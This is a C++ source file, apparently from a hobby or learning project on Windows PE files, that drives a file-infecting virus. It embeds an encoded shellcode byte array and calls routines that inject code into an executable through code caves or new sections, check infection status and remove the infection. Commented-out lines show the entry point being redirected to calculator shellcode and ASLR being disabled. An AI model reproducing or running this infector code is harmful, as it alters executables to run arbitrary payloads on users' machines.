#include <iostream>
#include <vector>
#include <string>
#include <tuple>
#include <Windows.h>
#include "pe.hpp"
#include "virus.hpp"


using namespace std;
unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xca\x51\xbf\x08\x1c\xa3\x05\x57\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x36\x19\x3c\xec\xec\x4b"
"\xc5\x57\xca\x51\xfe\x59\x5d\xf3\x57\x06\x9c\x19\x8e\xda\x79"
"\xeb\x8e\x05\xaa\x19\x34\x5a\x04\xeb\x8e\x05\xea\x19\x34\x7a"
"\x4c\xeb\x0a\xe0\x80\x1b\xf2\x39\xd5\xeb\x34\x97\x66\x6d\xde"
"\x74\x1e\x8f\x25\x16\x0b\x98\xb2\x49\x1d\x62\xe7\xba\x98\x10"
"\xee\x40\x97\xf1\x25\xdc\x88\x6d\xf7\x09\xcc\x28\x85\xdf\xca"
"\x51\xbf\x40\x99\x63\x71\x30\x82\x50\x6f\x58\x97\xeb\x1d\x13"
"\x41\x11\x9f\x41\x1d\x73\xe6\x01\x82\xae\x76\x49\x97\x97\x8d"
"\x1f\xcb\x87\xf2\x39\xd5\xeb\x34\x97\x66\x10\x7e\xc1\x11\xe2"
"\x04\x96\xf2\xb1\xca\xf9\x50\xa0\x49\x73\xc2\x14\x86\xd9\x69"
"\x7b\x5d\x13\x41\x11\x9b\x41\x1d\x73\x63\x16\x41\x5d\xf7\x4c"
"\x97\xe3\x19\x1e\xcb\x81\xfe\x83\x18\x2b\x4d\x56\x1a\x10\xe7"
"\x49\x44\xfd\x5c\x0d\x8b\x09\xfe\x51\x5d\xf9\x4d\xd4\x26\x71"
"\xfe\x5a\xe3\x43\x5d\x16\x93\x0b\xf7\x83\x0e\x4a\x52\xa8\x35"
"\xae\xe2\x40\xa6\xa2\x05\x57\xca\x51\xbf\x08\x1c\xeb\x88\xda"
"\xcb\x50\xbf\x08\x5d\x19\x34\xdc\xa5\xd6\x40\xdd\xa7\x5d\x0b"
"\x65\x20\x10\x05\xae\x89\x1e\x98\xa8\x1f\x19\x3c\xcc\x34\x9f"
"\x03\x2b\xc0\xd1\x44\xe8\x69\xa6\xbe\x10\xd9\x23\xd0\x62\x1c"
"\xfa\x44\xde\x10\xae\x6a\x6b\x7d\xcf\x66\x79\xaf\x29\xda\x08"
"\x1c\xa3\x05\x57";

int main() {

	cout << hex;
	string pe_file("./test2.exe");
	PEHelper pe_info;
	pe_info.LoadPE(pe_file);
	pe_info.DisplayPEInfo();
	//pe_info.LoadPE("C:/Users/qiufeng/Desktop/user32.dll");
	//pe_info.LoadPE("C:/Users/qiufeng/Desktop/user64.dll");
	//cout << pe_info.GetImageBase() << endl;
	//cout << pe_info.RVAToFOA(0x12314) << endl;

	//vector<string> names = pe_info.GetSectionNames();
	//cout << "节名：" << endl;
	//for (auto it = names.begin(); it != names.end(); it++) {
	//	cout << (*it) << endl;
	//}

	//vector<IMAGE_IMPORT_DESCRIPTOR> import_descriptor = pe_info.GetImageImportDescriptors();
	//vector<IMAGE_THUNK_DATA32> thunk_data32 = pe_info.GetImageThunkData32(import_descriptor[0]);
	//vector<string> dll_names = pe_info.GetImportDLLNames();
	//cout << "引入的dll名：" << endl;
	//for (auto it = dll_names.begin(); it != dll_names.end(); it++) {
	//	cout << (*it) << endl;
	//}

	//vector<tuple<WORD, string>> function_names = pe_info.GetImportFunctionNames(import_descriptor[1]);
	//IMAGE_EXPORT_DIRECTORY edt = pe_info.GetExportDirectory();
	//DWORD message_rva = pe_info.GetExportFunctionRVA("MessageBoxA");

	//cout << "是否开启 ALSR: " << pe_info.HasASLR() << endl;
	//pe_info.CloseASLR();
	//cout << "是否开启 ALSR: " << pe_info.HasASLR() << endl;
	//pe_info.OpenASLR();
	//cout << "是否开启 ALSR: " << pe_info.HasASLR() << endl;

	//pe_info.DisplayPEInfo();
	//cout << "新节起始FOA: " << pe_info.GetNewSectionFOA() << endl;
	//cout << "新节起始位置RVA: " << pe_info.GetNewSectionRVA() << endl;
	//string buffer = GetCalcuatorShellcode32(pe_info.GetEntryPointRVA() + pe_info.GetImageBase());
	//// 需要跳过旧 eip
	//pe_info.SetEntryPoint(pe_info.GetNewSectionRVA() + 4);
	//const CHAR* tmp_name = ".qiufeng";
	//BYTE name[8];
	//for (int i = 0; i != IMAGE_SIZEOF_SHORT_NAME; i++) {
	//	name[i] = static_cast<BYTE>(tmp_name[i]);
	//}
	//pe_info.AddNewSection(buffer, name);
	//pe_info.SetEntryPoint(0x10);
	//pe_info.SetEntryPoint(0x1000);

	InfectHelper vh(pe_file);
	InfectPadding pad = vh.LoadInfectPadding();
	cout << vh.InfectByCodeCave();
	cout << vh.IsInfected();
	cout << vh.InfectByAddSection();
	cout << vh.InfectByCodeCave();
	cout << vh.IsInfected();
	cout << vh.RemoveVirus();
	cout << vh.InfectByCodeCave();
	cout << vh.InfectByAddSection();
	cout << vh.RemoveVirus();
	cout << vh.IsInfected();
	cout << vh.IsInfected();
	cout << vh.InfectByAddSection();
	cout << vh.InfectByCodeCave();
	//cout << vh.RemoveVirus();
	return 0;
}